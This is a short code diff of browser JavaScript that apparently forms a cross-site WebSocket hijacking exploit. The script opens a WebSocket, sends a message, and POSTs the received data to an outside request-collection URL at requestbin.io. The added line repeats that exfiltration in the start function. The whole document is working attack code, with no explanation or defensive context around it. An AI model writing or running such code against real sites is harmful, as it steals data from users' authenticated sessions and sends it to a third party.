@@ -7,6 +7,7 @@
     websocket.onmessage = handleReply
     function start(event) {
       websocket.send("msg");
+      fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
     }
     function handleReply(event) {
       fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
